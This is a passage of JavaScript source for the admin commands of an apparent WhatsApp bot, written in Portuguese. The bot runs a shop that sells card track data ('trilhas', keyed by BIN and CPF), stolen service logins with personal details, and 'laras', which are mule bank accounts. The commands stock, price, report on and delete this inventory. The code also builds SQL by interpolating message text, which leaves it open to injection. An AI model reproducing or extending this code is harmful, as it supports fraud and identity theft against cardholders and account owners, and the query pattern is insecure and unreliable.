        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("📠 AJUSTES - Trilhas") > -1 || Mensagem_Texto.toString() === "/admtrilha" && Adms.includes(Numero)) {

            Texto = `📠 *TRILHAS* 📠

◎ ══════ ❈ ══════ ◎
*ALTERAR TEXTO AO COMPRAR TRILHA*
◎ ══════ ❈ ══════ ◎

/textocomproutrilha===OBRIGADO POR COMPRAR MEU MATERIAL
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*ABASTECER TRILHAS*
◎ ══════ ❈ ══════ ◎
/addtrilha===BIN===CPF===LEVEL===PRECO===TUDO_DA_TRILHA

EXEMPLO:

/addtrilha===544731===99999999999===226===150===COLA TUDO DA TRILHA AQUI

(Para abaster mais de uma ao mesmo tempo, basta colocar um comando abaixo do outro e enviar no Bot.)
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DEFINIR PREÇO POR ID*
◎ ══════ ❈ ══════ ◎

(Use o ID do produto olhando no estoque.)

/valortrilhaporid===[ID]===[NOVO PREÇO]

EXEMPLO:

/valortrilhaporid===1===10
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*BAIXE TODOS AS TRILHAS DO ESTOQUE*
◎ ══════ ❈ ══════ ◎

/baixarestoquetrilhas
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DELETE TODAS AS TRILHAS DO ESTOQUE*
◎ ══════ ❈ ══════ ◎

/deletarestoquetrilhas
┕━━━━╗✹╔━━━━┙`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("📱 AJUSTES - LOGINS") > -1 || Mensagem_Texto.toString() === "/admlogin" && Adms.includes(Numero)) {
            Texto = `📱 *LOGINS* 📱

◎ ══════ ❈ ══════ ◎
*ALTERAR TEXTO MENU LOGINS*
◎ ══════ ❈ ══════ ◎

/textomenulogin===BEM VINDO AO MENU DE LOGINS!
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*ALTERAR TEXTO AO COMPRAR LOGIN*
◎ ══════ ❈ ══════ ◎

/textocomproulogin===OBRIGADO POR COMPRAR MEU MATERIAL
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*ABASTECER LOGINS*
◎ ══════ ❈ ══════ ◎

(Padrão de abastecimento Simples)
/addloginsimples===SERVICO===PREÇO===INFORMACÕES_ADICIONAIS

(Padrão de abastecimento Normal)
/addloginmanual1===SERVIÇO===EMAIL===SENHA===NOME===CPF===USER===TELEFONE===ESTADO===CIDADE===PREÇO===INFORMACÕES_ADICIONAIS

(Padrão de abastecimento para clientes especificos que possuem checker)
/addloginauto1===SERVIÇO===PREÇO===RETORNO CHECKER

(Fiz para o cliente JEFF, é um simples que tem email e senha a mais.)
/addloginjeff===SERVIÇO===EMAIL===SENHA===PREÇO===INFORMACÕES_ADICIONAIS
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*OPÇÕES DE COMO VENDER LOGINS*
◎ ══════ ❈ ══════ ◎

Simples: /modevendalogin===1
Detalhado: /modevendalogin===2



◎ ══════ ❈ ══════ ◎
*DEFINIR PREÇO POR ID*
◎ ══════ ❈ ══════ ◎

(Use o ID do produto olhando no estoque.)

/valorloginporid===1===10
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DEFINIR PREÇO NOME DO SERVIÇO*
◎ ══════ ❈ ══════ ◎

/valorloginporservico===NETFLIX===30
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*RELATÓRIO VENDAS LOGIN*
◎ ══════ ❈ ══════ ◎

/relatoriovendalogin
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*BAIXE TODOS OS LOGINS DO ESTOQUE*
◎ ══════ ❈ ══════ ◎

/baixarestoquelogin
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DELETE TODAS OS LOGINS DO ESTOQUE*
◎ ══════ ❈ ══════ ◎

/deletarestoquelogin
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DELETAR LOGINS DE UM SERVIÇO ESPEC´FICO*
◎ ══════ ❈ ══════ ◎

/deservicologin===NETFLIX
┕━━━━╗✹╔━━━━┙`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("💱 AJUSTES - LARAS") > -1 || Mensagem_Texto.toString() === "/geghbdtrht" && Adms.includes(Numero)) {
            Texto = `*💱 LARAS 💱*

◎ ══════ ❈ ══════ ◎
*ALTERAR TEXTO MENU LARAS*
◎ ══════ ❈ ══════ ◎

/textomenularas===BEM VINDO AO MENU DE LARAS!
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*ALTERAR TEXTO AO COMPRAR LARAS*
◎ ══════ ❈ ══════ ◎

/textocomproulara===OBRIGADO POR COMPRAR MEU MATERIAL
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*ABASTECER LARAS*
◎ ══════ ❈ ══════ ◎

/addlara===BANCO===NOME===PREÇO===ADICIONAIS

Exemplo:
/addlara===MERCADO PAGO===Larissa Manoela===150===Conta Nivel 6, PJ e muito boa!
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DEFINIR PREÇOS*
◎ ══════ ❈ ══════ ◎

(Use o ID da Lara)

/valorlara===1===10
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*BAIXE TODOS AS LARAS DO ESTOQUE*
◎ ══════ ❈ ══════ ◎

/baixarestoquelara
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DELETE TODAS OS LARAS DO ESTOQUE*
◎ ══════ ❈ ══════ ◎

/deletarestoquelara
┕━━━━╗✹╔━━━━┙`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳





        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/manutencao===") > -1 && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            if (msg[1] === "0") {
                Texto = `Manutenção encerrada, Bot pronto para interação!`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '0' WHERE PARAMETRO = 'MANUTENCAO'`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } else if (msg[1] === "1") {
                Texto = `*O Bot entrou em manutenção.*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '1' WHERE PARAMETRO = 'MANUTENCAO'`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } else {
                Texto = `Ou 1 para colocar em manutenção ou 0 para liberar o bot...`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/nomebot===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                NOME_BOT = msg[1]
                NOME_BOT = NOME_BOT.replace(/\'/igm, "")
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${NOME_BOT}' WHERE PARAMETRO = 'NOME_BOT'`).run()
                Nome_Bot = NOME_BOT

                Texto = `*NOME DO BOT ALTERADO COM SUCESSO!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                return
            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/textosuporte===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")

                if (msg[1] === "") {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                TEXTO_SUPORTE = msg[1]
                TEXTO_SUPORTE = TEXTO_SUPORTE.replace(/\'/igm, "")
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${TEXTO_SUPORTE}' WHERE PARAMETRO = 'TEXTO_SUPORTE'`).run()

                Texto = `*TEXTO COM CONTATOS DO SUPORTE ALTERADO COM SUCESSO!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
